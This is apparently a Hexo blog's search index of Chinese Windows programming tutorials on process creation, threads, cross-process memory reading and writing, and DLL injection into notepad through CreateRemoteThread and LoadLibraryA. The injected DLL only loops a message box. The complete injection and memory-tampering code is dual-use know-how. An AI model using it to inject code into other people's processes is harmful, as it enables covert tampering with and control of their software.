{"pages":[],"posts":[{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2021/01/12/hello-world/"},{"title":"在Windows中使用CreateProcess创建子进程","text":"本文记录了在Windows中使用CreateProcessA创建子进程的方法。 CreateProcessA函数原型123456789101112BOOL CreateProcessA( LPCSTR lpApplicationName, //应用程序名 LPSTR lpCommandLine, //命令行 LPSECURITY_ATTRIBUTES lpProcessAttributes, //如果为NULL，则子进程不会继承新进程的句柄 LPSECURITY_ATTRIBUTES lpThreadAttributes, //如果为NULL，则子进程不会继承新线程的句柄 BOOL bInheritHandles, //父进程的可继承句柄是否继承给新的进程 DWORD dwCreationFlags, //控制子进程的创建过程和优先级的标志 LPVOID lpEnvironment, //如果为NULL，则新的进程会使用父进程的环境 LPCSTR lpCurrentDirectory, //如果为NULL，则新的进程与父进程会有相同目录 LPSTARTUPINFOA lpStartupInfo, //用于设置新进程的主窗口特性 LPPROCESS_INFORMATION lpProcessInformation //PROCESS_INFORMATION指针，用于获取新进程的信息); 本文只关心lpApplicationName, lpCommandLine, lpStartupInfo, lpProcessInformation 这四个参数。 简单示例接下来，写一个简单的示例来说明这个函数的基本用法。 编写程序作为子进程编写child.c，代码为： 12345678#include &lt;stdio.h&gt;int main(int argc, char **argv) { for(int i = 0; i &lt; argc; i++) { printf(&quot;argv[%d]: %s\\n&quot;, i, argv[i]); } return 0;} 功能很简单，就是打印argv字符串数组的内容。编译后在命令行中运行child 123456789 abcdefg !@#$%： 12345&gt; child 123456789 abcdefg !@#$%argv[0]: childargv[1]: 123456789argv[2]: abcdefgargv[3]: !@#$% 编写程序调用CreateProcessA创建子进程编写程序parent，代码如下： 12345678910111213141516171819#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;int main() { STARTUPINFO si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si); CreateProcessA( &quot;child.exe&quot;, //lpApplicationName &quot;abcdefg !@#$%^&amp;&quot;, //lpCommandLine NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, //lpStartupInfo &amp;pi); //lpProcessInformation return 0;} parent会调用CreateProcessA，创建子进程child，而child则会打印argv数组： 123&gt; parentargv[0]: abcdefgargv[1]: !@#$%^&amp; child中argv的内容和lpCommandLine字符串的内容是一致的。 lpApplicationName可以为NULL，此时应用程序的名字为lpCommandLine中第一个被空格隔开的字符串： CreateProcessA function (processthreadsapi.h) 对简单示例的进一步完善对创建进程操作是否成功的判断CreateProcessA会返回BOOL类型的变量，表示本次创建进程的操作是否成功。因此，可以加上对函数返回值的判断： 1234567891011121314BOOL result = CreateProcessA( &quot;child.exe&quot;, //lpApplicationName &quot;abcdefg !@#$%^&amp;&quot;, //lpCommandLine NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, //lpStartupInfo &amp;pi); //lpProcessInformationif(!result) { printf(&quot;Create Process Failed!\\n&quot;); return -1;} 创建进程失败时获取错误码如果CreateProcessA返回FALSE，则可以通过GetLastError获取错误码，GetLastError定义在头文件errhandlingapi.h中。 1234if(!result) { printf(&quot;Create Process Failed! Error Code:%d\\n&quot;, GetLastError()); return -1;} 在调用CreateProcessA之前，会通过STARTUPINFO si = {0};将STARTUPINFO结构体si的内容清零。现在将清零操作去掉，重新编译运行parent，看是否还能成功创建子进程： 12&gt; parentCreate Process Failed! Error Code:998 创建子进程失败了，错误码为998，查阅System Error Codes (500-999)： ERROR_NOACCESS 998 (0x3E6) Invalid access to memory location. 发生了对内存地址的无效访问。这说明STARTUPINFO结构体使用之前清零是有必要的。 通过PROCESS_INFORMATION结构体获取子进程信息CreateProcessA的最后一个参数为LPPROCESS_INFORMATION lpProcessInformation，是一个PROCESS_INFOMATION结构体指针。PROCESS_INFOMATION的定义为： 123456typedef struct _PROCESS_INFORMATION { HANDLE hProcess; HANDLE hThread; DWORD dwProcessId; DWORD dwThreadId;} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION; CreateProcessA会创建一个进程和它的主线程，hProcess就是这个进程的句柄，hThread就是进程的主线程的句柄。dwProcessId和dwThreadId分别为进程和它的主线程的标识符ID。 简单示例中传入的参数为&amp;pi，因此就可以通过pi得到创建的进程以及其主线程的句柄和标识符了。添加如下代码，打印子进程的进程标识符： 1printf(&quot;Child Process ID: %d\\n&quot;, pi.dwProcessId); 运行parent： 1234&gt; parentChild Process ID: 13816argv[0]: abcdefgargv[1]: !@#$%^&amp; 父进程等待子进程执行结束在Linux中，父进程可以通过wait系统调用等待子进程执行完毕。Windows中也有类似的功能，即WaitForSingleObject。 WaitForSingleObject的函数原型为： 1234DWORD WaitForSingleObject( HANDLE hHandle, DWORD dwMilliseconds); 需要传入两个参数，hHandle为对象的句柄，dwMilliseconds为等待的毫秒数。如果对象结束，或对象没有结束但经过了dwMilliseconds毫秒，则等待完毕，进程继续执行后面的语句。 父进程可以通过PROCESS_INFORMATION结构体获取子进程的进程句柄，然后再将子进程的句柄传入WaitForSingleObject中，即可等待子进程执行完毕。 在打印子进程ID前，添加语句： 1WaitForSingleObject(pi.hProcess, 10000); 再运行parent，得到的结果为： 1234&gt; parentargv[0]: abcdefgargv[1]: !@#$%^&amp;Child Process ID: 3944 说明父进程会等待子进程child执行完毕后再打印子进程的ID。 关闭PROCESS_INFORMATION中的句柄一个更好的习惯是在PROCESS_INFORMATION中的句柄使用完毕后，用CloseHandle将其关闭。 If the function succeeds, be sure to call the CloseHandle function to close the hProcess and hThread handles when you are finished with them. Otherwise, when the child process exits, the system cannot clean up the process structures for the child process because the parent process still has open handles to the child process. However, the system will close these handles when the parent process terminates, so the structures related to the child process object would be cleaned up at this point. 在parent.c的末尾添加CloseHandle代码： 12CloseHandle(pi.hProcess);CloseHandle(pi.hThread); 最终，得到的完整的parent.c代码为： 123456789101112131415161718192021222324252627282930#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;#include &lt;errhandlingapi.h&gt;#include &lt;synchapi.h&gt;#include &lt;handleapi.h&gt;int main() { STARTUPINFO si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si); BOOL result = CreateProcessA( &quot;child.exe&quot;, //lpApplicationName &quot;abcdefg !@#$%^&amp;&quot;, //lpCommandLine NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, //lpStartupInfo &amp;pi); //lpProcessInformation if(!result) { printf(&quot;Create Process Failed! Error Code:%d\\n&quot;, GetLastError()); return -1; } WaitForSingleObject(pi.hProcess, 10000); printf(&quot;Child Process ID: %d\\n&quot;, pi.dwProcessId); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;}","link":"/2021/01/17/windows-createprocess/"},{"title":"Windows读写其他进程内存的方法","text":"本文记录了如何使用Windows提供的ReadProcessMemory和WriteProcessMemory对其他进程的内存空间进行读写操作。 ReadProcessMemory和WriteProcessMemory的函数原型1234567BOOL ReadProcessMemory( HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead); 1234567BOOL WriteProcessMemory( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten); Microsoft的文档中有对每个参数的详细解释： ReadProcessMemory function (memoryapi.h) WriteProcessMemory function (memoryapi.h) 使用这两个函数，需要传入目标进程的句柄、想要读写内存的基地址、读写内存的大小等信息。在通过CreateProcess创建子进程时，可以通过PROCESS_INFORMATION结构体得到子进程的句柄。因此，先来看读写子进程内存的方法。 读写子进程内存编写子进程子进程的功能为打印全局变量i的值，并使变量i不断自增。 12345678910#include &lt;stdio.h&gt;#include &lt;synchapi.h&gt;int i;int main() { while(1) { printf(&quot;%d. &quot;, i++); Sleep(100); }} 运行结果为： 12&gt; child0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 24. 25. 26. 27. 28. 29. 30. 31. 32. 33. 34. 35. 36. 37. 38. 39. 40. 41. 42. 43. 44. 45. 46. 47. 48. 49. 编写父进程读取子进程内存父进程首先要通过CreateProcess创建子进程，然后通过PROCESS_INFORMATION结构体获取子进程的句柄。之后，再将句柄传入ReadProcessMemory，即可读取子进程的内存。 如果要让父进程修改子进程的全局变量i，则需要知道i的内存地址，这可以通过反汇编工具（如IDA Pro）获取。我使用的编译器会将全局变量i的内存地址设置为0x407970，不同编译器编译得到的child中i的内存地址可能不同。 12345678910111213141516171819202122232425262728293031323334353637#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;#include &lt;errhandlingapi.h&gt;#include &lt;synchapi.h&gt;#include &lt;handleapi.h&gt;#include &lt;memoryapi.h&gt;int main() { //创建子进程 STARTUPINFO si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si); BOOL result = CreateProcessA( &quot;child.exe&quot;, //lpApplicationName NULL, //lpCommandLine NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, //lpStartupInfo &amp;pi); //lpProcessInformation if(!result) { printf(&quot;Create Process Failed! Error Code:%d\\n&quot;, GetLastError()); return -1; } //读写子进程全局变量i，地址为0x407970 int childi; while(1) { ReadProcessMemory(pi.hProcess, (void *)0x407970, &amp;childi, sizeof(int), NULL); printf(&quot;\\nparent read child i: %d\\n&quot;, childi); Sleep(600); } CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;} 运行parent： 12345678910111213&gt; parentparent read child i: 00. 1. 2. 3. 4. 5.parent read child i: 66. 7. 8. 9. 10. 11.parent read child i: 1212. 13. 14. 15. 16. 17.parent read child i: 1818. 19. 20. 21. 22. 23.parent read child i: 2424. 25. 26. 27. 28. 29.parent read child i: 30 可以看出parent成功读取了child中变量i的内容。 添加修改子进程内存的代码使用WriteProcessMemory可以修改子进程中i的值。在parent中添加代码： 12345678910//读写子进程全局变量i，地址为0x407970int childi;while(1) { ReadProcessMemory(pi.hProcess, (void *)0x407970, &amp;childi, sizeof(int), NULL); if(childi &gt; 20) { childi = 0; WriteProcessMemory(pi.hProcess, (void *)0x407970, &amp;childi, sizeof(int), NULL); } Sleep(600);} 当读取到的i大于20时，就将i清零，并写入子进程的内存当中。运行parent： 12345&gt; parent0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 0. 1. 2. 3. 4. 5. 6. i大于20后不久就会被清零。之所以没有立即清零是因为parent中有一个Sleep(600);。 读取其他进程的内存读写其他进程内存需要首先获取其句柄，这可以通过函数OpenProcess得到。 OpenProcess函数原型12345HANDLE OpenProcess( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId); 因此，知道了目标进程的进程标识符ProcessId，就可以获得其句柄了。 OpenProcess function (processthreadsapi.h) 编写目标进程代码目标进程会先调用GetCurrentProcessId获取自身的进程标识符并打印出来，然后就开始不断打印全局变量i的值并将i加一。 123456789101112#include &lt;stdio.h&gt;#include &lt;synchapi.h&gt;#include &lt;processthreadsapi.h&gt;int i;int main() { printf(&quot;My Process ID: %d\\n&quot;, GetCurrentProcessId()); while(1) { printf(&quot;%d. &quot;, i++); Sleep(100); }} 编写修改器代码修改器会先根据目标进程的ProcessId获取句柄，然后再调用ReadProcessMemory和WriteProcessMemory读写目标进程的全局变量i，当i大于20时清零。 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;processthreadsapi.h&gt;#include &lt;synchapi.h&gt;#include &lt;memoryapi.h&gt;#include &lt;errhandlingapi.h&gt;int main(int argc, char **argv) { if(argc &lt; 2) { printf(&quot;Usage: modifier [pid]\\n&quot;); return -1; } //OpenProcess获得目标进程的句柄 int targetPid = atoi(argv[1]); HANDLE hTarget = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, targetPid); if(NULL == hTarget) { printf(&quot;Open Process Failed! Error Code: %d\\n&quot;, GetLastError()); return -1; } //读写目标进程全局变量i，地址为0x407970 int targetI; BOOL result; while(1) { result = ReadProcessMemory(hTarget, (void *)0x407970, &amp;targetI, sizeof(int), NULL); if(!result) { printf(&quot;Read Process Memory Failed! Error Code: %d\\n&quot;, GetLastError()); return -1; } else if(targetI &gt; 20) { targetI = 0; result = WriteProcessMemory(hTarget, (void *)0x407970, &amp;targetI, sizeof(int), NULL); if(!result) { printf(&quot;Write Process Memory Failed! Error Code: %d\\n&quot;, GetLastError()); return -1; } } Sleep(600); } return 0;} 运行结果首先运行目标程序program，得到其进程标识符为4372，然后再运行修改器程序并传入参数4372，即modifier 4372，一段时间后终止修改器。最终，program的打印结果如下： 12345678910&gt; programMy Process ID: 43720. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 24. 25. 26. 27. 28. 29. 30. 31. 32. 33. 34. 35. 36. 37. 38. 39. 40. 41. 42. 43. 44. 45. 46. 47. 48. 49. 50. 51. 52. 53. 54. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 24. 25. 26. 27. 28. 29. 30. 31. 32. 33. 34. 35. 36. 37. 38. 39. 40. 41. 42. 43. 44. 45. 46. 47. 48. 49. 50. 51. 52. 53. 54. 55. 56. 57. 全局变量i一开始会不断自增，当修改器开始运行后，i的值便被清零，然后当i的值超过20后也会被清零。修改器停止运行后，i的值又会不断自增而不会被清零。","link":"/2021/01/19/windows-modify-process-memory/"},{"title":"使用CreateRemoteThread向目标进程注入DLL","text":"在之前的文章中提到，如果要使用CreateRemoteThread在目标进程中创建远程线程： 在正常使用时，远程线程的代码是在目标进程中本来就有的。 是否有一种手段，使得在目标进程中创建的远程线程，执行任意自己想要执行的代码呢？一种方法是通过DLL注入来实现。 假如当前用户正在运行一个记事本notepad进程，那么，其他进程就可以通过CreateRemoteThread在notepad进程中创建一个线程。不过通常情况下，线程中执行的代码是notepad进程中本来就有的。现在想让notepad进程执行下述代码： 1234char str[100];sprintf(str, &quot;pid: %d&quot;, GetCurrentProcessId());while(1) MessageBoxA(NULL, str, &quot;DLL Inject&quot;, MB_ICONSTOP | MB_OK); notepad本身不可能有这种无限弹窗的代码，所以没法直接通过CreateRemoteThread创建线程执行它们。通过DLL注入的方式，可以让notepad进程最终能执行上面这个无限弹窗的代码。 编写具有DllMain的DLL动态链接库dll文件中，通常包含一些其他代码可能会使用到的函数和数据。其他程序可以通过LoadLibraryA函数加载dll文件，然后就能使用dll中的函数了。 一些dll中会有一个DllMain函数，它被称为dll的入口点。当dll被装载时，DllMain中的代码就会被执行。Microsoft的文档：DllMain entry point 当自己编写dll的代码时，也可以自定义DllMain函数的内容。比如，将DllMain函数的内容写成无限弹窗的代码： 1234567891011#include &lt;windef.h&gt;#include &lt;winuser.h&gt;#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;BOOL WINAPI DllMain() { char str[100]; sprintf(str, &quot;pid: %d&quot;, GetCurrentProcessId()); while(1) MessageBoxA(NULL, str, &quot;DLL Inject&quot;, MB_ICONSTOP | MB_OK);} 将上述代码保存在文件0.c中。接下来，将其编译成0.dll。我使用的mingw-gcc将其编译成dll的命令为： 12gcc -c 0.c -o 0.ogcc -shared 0.o -o 0.dll 可以写个代码测试一下，看看加载这个dll文件是否会执行DllMain函数中的语句： 123456#include &lt;libloaderapi.h&gt;int main() { HMODULE h0 = LoadLibraryA(&quot;0.dll&quot;); return 0;} 编译运行，程序立刻弹窗，说明加载dll文件的行为确实是可以导致DllMain函数被执行的。 编写程序实现DLL注入现在，已经有了一个0.dll文件。当程序尝试加载这个dll文件时，会执行DllMain函数中的内容，发生无限弹窗。于是，现在的目标就变成了，让目标进程notepad加载这个0.dll文件。 将字符串&quot;D:\\0.dll&quot;传入notepad内存空间中为了方便起见，使用绝对路径加载dll文件。所以，先把0.dll复制到D盘根目录下，这样一来它的绝对路径就变成了&quot;D:\\0.dll&quot;。 字符串&quot;D:\\0.dll&quot;是LoadLibraryA函数的参数，要想办法让这个字符串出现在notepad的内存空间当中。可以通过以下步骤达成这一点： 使用OpenProcess获得目标进程notepad的句柄 使用VirtualAllocEx在目标进程中申请一块内存，并得到这块内存的起始地址 使用WriteProcessMemory将字符串&quot;D:\\0.dll&quot;写入这块内存当中 12345678910111213141516171819//获取目标进程句柄int pid = atoi(argv[1]);HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);if(NULL == hProcess) { printf(&quot;OpenProcess Error: %d\\n&quot;, GetLastError()); return -1;}//在目标进程中申请一块内存空间，写入字符串&quot;D:\\0.dll&quot;void *dllNamePtr = VirtualAllocEx(hProcess, NULL, 10, MEM_COMMIT, PAGE_READWRITE);if(NULL == dllNamePtr) { printf(&quot;VirtualAllocEx Error: %d\\n&quot;, GetLastError()); return -1;}BOOL result = WriteProcessMemory(hProcess, dllNamePtr, &quot;D:\\\\0.dll&quot;, 9, NULL);if(!result) { printf(&quot;WriteProcessMemory Error: %d\\n&quot;, GetLastError()); return -1;}printf(&quot;\\&quot;D:\\\\0.dll\\&quot; String Address: 0x%p\\n&quot;, dllNamePtr); 某次执行这段代码，申请到的内存地址为0x000001CE24A90000，使用x64dbg查看notepad中的这块内存： 说明成功写入了字符串&quot;D:\\0.dll&quot;。 获取LoadLibraryA的内存地址首先，通过GetModuleHandleA获取kernel32.dll模块的句柄，然后再使用GetProcAddress获取LoadLibraryA的地址： 123//找到LoadLibraryA的地址void *funcAddr = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;);printf(&quot;LoadLibraryA Address: 0x%p\\n&quot;, funcAddr); 有人可能会担心，通过上述方法，找到的是自身进程中LoadLibraryA的内存地址，并不是目标进程notepad中LoadLibraryA的地址。不过通常情况下，LoadLibraryA在不同进程中的地址是相同的。Dll injection - Wikipedia中提到： kernel32.dll is mapped to the same address in almost all processes. Therefore LoadLibrary (which is a function of kernel32.dll) is mapped to the same address as well. 所以，这种方法得到的LoadLibraryA的地址可以认为就是目标进程notepad中LoadLibraryA的地址。比如在某次执行上面的代码，得到的LoadLibraryA的地址为0x00007FFFC185EBB0，x64dbg找到进程notepad在这里的语句： 说明这个地方确实就是LoadLibraryA的入口点。 创建远程线程调用LoadLibraryA(&quot;D:\\0.dll&quot;)CreateRemoteThread中，线程函数只允许有一个参数，而LoadLibraryA恰好就是只需要一个参数。而且，经过之前的操作，已经知道了在notepad进程中LoadLibraryA的地址，以及字符串&quot;D:\\0.dll&quot;的地址，于是就可以通过CreateRemoteThread创建线程调用LoadLibraryA了。 1234567891011//创建远程线程调用LoadLibraryA(&quot;D:\\0.dll&quot;)，加载0.dllHANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, funcAddr, dllNamePtr, 0, NULL);WaitForSingleObject(hThread, INFINITE);DWORD exitCode;GetExitCodeThread(hThread, &amp;exitCode); //获取LoadLibraryA的返回值if(!exitCode) { printf(&quot;LoadLibraryA Failed!\\n&quot;); return -1;}printf(&quot;Inject Complete.\\n&quot;);return 0; 一旦notepad加载0.dll，就会执行其中的DllMain函数，而DllMain的内容又是无限弹窗程序。这样一来，notepad就会开始无限弹窗了。 完整代码及运行结果12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;windows.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv) { if(argc &lt; 2) { printf(&quot;Usage: injectdll [pid]\\n&quot;); return -1; } //获取目标进程句柄 int pid = atoi(argv[1]); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); if(NULL == hProcess) { printf(&quot;OpenProcess Error: %d\\n&quot;, GetLastError()); return -1; } //在目标进程中申请一块内存空间，写入字符串&quot;D:\\0.dll&quot; void *dllNamePtr = VirtualAllocEx(hProcess, NULL, 10, MEM_COMMIT, PAGE_READWRITE); if(NULL == dllNamePtr) { printf(&quot;VirtualAllocEx Error: %d\\n&quot;, GetLastError()); return -1; } BOOL result = WriteProcessMemory(hProcess, dllNamePtr, &quot;D:\\\\0.dll&quot;, 9, NULL); if(!result) { printf(&quot;WriteProcessMemory Error: %d\\n&quot;, GetLastError()); return -1; } printf(&quot;\\&quot;D:\\\\0.dll\\&quot; String Address: 0x%p\\n&quot;, dllNamePtr); //找到LoadLibraryA的地址 void *funcAddr = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); printf(&quot;LoadLibraryA Address: 0x%p\\n&quot;, funcAddr); //创建远程线程调用LoadLibraryA(&quot;D:\\0.dll&quot;)，加载0.dll HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, funcAddr, dllNamePtr, 0, NULL); WaitForSingleObject(hThread, INFINITE); DWORD exitCode; GetExitCodeThread(hThread, &amp;exitCode); //获取LoadLibraryA的返回值 if(!exitCode) { printf(&quot;LoadLibraryA Failed!\\n&quot;); return -1; } printf(&quot;Inject Complete.\\n&quot;); return 0;} 首先，打开记事本，然后在任务管理器的“详细信息”这一栏找到notepad.exe的pid，比如pid为5908。 假设上述代码被编译成了injectdll.exe，接下来，执行injectdll 5908，便能看到记事本的弹窗了：","link":"/2021/01/22/windows-remotethread-dllinject/"},{"title":"在Windows中创建线程和远程线程","text":"本文记录了如何使用CreateThread和CreateRemoteThread创建线程和远程线程。 创建线程CreateThread函数在Windows中创建线程可以使用CreateThread函数，其原型为： 12345678HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); 最重要的两个参数为lpStartAddress和lpParameter，分别表示线程的起始地址和线程函数的参数。在C语言中，可以用函数名表示函数的起始地址。如果线程创建成功，则会返回新线程的句柄。 参数的详细解释可以参考Microsoft的文档： CreateThread function (processthreadsapi.h) 下面编写一个简单示例来说明CreateThread函数的用法。 线程函数的编写由于线程可以共享进程的全局变量，因此可以编写线程对全局变量进行读写操作。 首先设置一个全局变量i： 1int i; 然后编写两个线程函数。第一个函数会让i不断加上一个数，内容为： 1234567891011121314151617/* thread_func1 * 传入参数： * param[0]: 循环次数 * param[1]: 自增数 * 功能： * 每次循环让全局变量i加上param[1] * 循环param[0]次 */void thread_func1(int *param) { printf(&quot;Thread 1 Start\\n&quot;); for(int j = 0; j &lt; param[0]; j++) { i += param[1]; printf(&quot;%d. &quot;, i); Sleep(100); } printf(&quot;\\nThread 1 End\\n&quot;);} 第二个函数会检查i是否大于某个值，如果是则会将i清零： 12345678910111213141516171819/* thread_func2 * 传入参数： * param[0]: 循环次数 * param[1]: 上限 * 功能： * 每次循环检查全局变量i是否大于param[1] * 如果大于param[1]则将i清零 * 循环param[0]次 */void thread_func2(int *param) { printf(&quot;\\nThread 2 Start\\n&quot;); for(int j = 0; j &lt; param[0]; j++) { if(i &gt; param[1]) { i = 0; } Sleep(100); } printf(&quot;\\nThread 2 End\\n&quot;);} CreateThread中函数的参数只允许传入一个，所以如果需要传入多个参数，可以通过传入数组来实现。 main函数的编写接下来编写main函数。 首先要准备两个函数参数的数组： 12int func1_param[2] = {70, 3};int func2_param[2] = {30, 20}; 第一个函数的两个参数为70和3，说明要循环70次，每次循环i要加上3；第二个函数的两个参数为30和20，说明要循环30次，如果i大于20则将i清零。 然后调用CreateThread先后创建两个线程： 123456789101112131415161718192021222324HANDLE threadHandles[2];//创建第一个线程，执行thread_func1threadHandles[0] = CreateThread(NULL, //lpThreadAttributes 0, //dwStackSize thread_func1, //lpStartAddress func1_param, //lpParameter 0, //dwCreationFlags NULL); //lpThreadIdif(NULL == threadHandles[0]) { //检查线程是否创建成功 printf(&quot;Create Thread 1 Failed! Error Code: %d\\n&quot;, GetLastError()); return -1;}//2秒后创建第二个线程，执行thread_func2Sleep(2000);threadHandles[1] = CreateThread(NULL, //lpThreadAttributes 0, //dwStackSize thread_func2, //lpStartAddress func2_param, //lpParameter 0, //dwCreationFlags NULL); //lpThreadIdif(NULL == threadHandles[1]) { //检查线程是否创建成功 printf(&quot;Create Thread 2 Failed! Error Code: %d\\n&quot;, GetLastError()); return -1;} 如果要等待两个线程同时结束后再继续接下来的操作，则可以使用WaitForMultipleObjects： 1WaitForMultipleObjects(2, threadHandles, TRUE, 100000); 最后关闭句柄： 123CloseHandle(threadHandles[0]);CloseHandle(threadHandles[1]);return 0; 完整代码及运行结果123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;stdio.h&gt;#include &lt;processthreadsapi.h&gt;#include &lt;synchapi.h&gt;#include &lt;errhandlingapi.h&gt;#include &lt;handleapi.h&gt;int i;/* thread_func1 * 传入参数： * param[0]: 循环次数 * param[1]: 自增数 * 功能： * 每次循环让全局变量i加上param[1] * 循环param[0]次 */void thread_func1(int *param) { printf(&quot;Thread 1 Start\\n&quot;); for(int j = 0; j &lt; param[0]; j++) { i += param[1]; printf(&quot;%d. &quot;, i); Sleep(100); } printf(&quot;\\nThread 1 End\\n&quot;);}/* thread_func2 * 传入参数： * param[0]: 循环次数 * param[1]: 上限 * 功能： * 每次循环检查全局变量i是否大于param[1] * 如果大于param[1]则将i清零 * 循环param[0]次 */void thread_func2(int *param) { printf(&quot;\\nThread 2 Start\\n&quot;); for(int j = 0; j &lt; param[0]; j++) { if(i &gt; param[1]) { i = 0; } Sleep(100); } printf(&quot;\\nThread 2 End\\n&quot;);}int main() { int func1_param[2] = {70, 3}; int func2_param[2] = {30, 20}; HANDLE threadHandles[2]; //创建第一个线程，执行thread_func1 threadHandles[0] = CreateThread(NULL, //lpThreadAttributes 0, //dwStackSize thread_func1, //lpStartAddress func1_param, //lpParameter 0, //dwCreationFlags NULL); //lpThreadId if(NULL == threadHandles[0]) { //检查线程是否创建成功 printf(&quot;Create Thread 1 Failed! Error Code: %d\\n&quot;, GetLastError()); return -1; } //2秒后创建第二个线程，执行thread_func2 Sleep(2000); threadHandles[1] = CreateThread(NULL, //lpThreadAttributes 0, //dwStackSize thread_func2, //lpStartAddress func2_param, //lpParameter 0, //dwCreationFlags NULL); //lpThreadId if(NULL == threadHandles[1]) { //检查线程是否创建成功 printf(&quot;Create Thread 2 Failed! Error Code: %d\\n&quot;, GetLastError()); return -1; } WaitForMultipleObjects(2, threadHandles, TRUE, 100000); CloseHandle(threadHandles[0]); CloseHandle(threadHandles[1]); return 0;} 12345678&gt; threadtestThread 1 Start3. 6. 9. 12. 15. 18. 21. 24. 27. 30. 33. 36. 39. 42. 45. 48. 51. 54. 57.Thread 2 Start3. 6. 9. 12. 15. 18. 21. 3. 6. 9. 12. 15. 18. 21. 3. 6. 9. 12. 15. 18. 21. 3. 6. 9. 12. 15. 18. 21. 3. 6.Thread 2 End9. 12. 15. 18. 21. 24. 27. 30. 33. 36. 39. 42. 45. 48. 51. 54. 57. 60. 63. 66. 69.Thread 1 End 线程1开始后，i会不断增加，然后，当线程2开始后，i超过20便会被清零。线程2结束后，i又会不断增加，而不会被清零。 创建远程线程在Windows中，进程除了可以给自己创建线程，还可以给其他进程创建线程，这就是远程线程。创建远程线程需要用到CreateRemoteThread函数。 CreateRemoteThread函数123456789HANDLE CreateRemoteThread( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); 和CreateThread相比，只多了一个hProcess参数，表示目标进程的句柄。此外，这里的lpStartAddress指的是目标进程中函数的内存地址，所以在正常使用时，远程线程的代码是在目标进程中本来就有的。 参数的详细解释可以查看Microsoft的文档： CreateRemoteThread function (processthreadsapi.h) 接下来，编写一个简单示例来说明这个函数的用法。 编写目标程序目标进程的代码中首先还是设置一个全局变量i，然后是main函数： 12345678int main() { printf(&quot;Process ID: %d\\n&quot;, GetCurrentProcessId()); while(1) { printf(&quot;%d. &quot;, i++); Sleep(100); } return 0;} main函数首先会打印自身的Process ID，然后就会不断地让全局变量i加一，并打印出来。 接下来，再编写一个函数thread_func： 12345678int thread_func() { while(1) { if(i &gt; 20) { i = 0; } Sleep(600); }} 由于main函数中并没有调用这个函数，因此正常运行目标程序，全局变量i并不会清零。 123&gt; programProcess ID: 140320. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 24. 25. 26. 27. 28. 29. 30. 31. 32. 33. 34. 编写程序为目标进程开启远程线程首先通过反汇编工具（如IDA 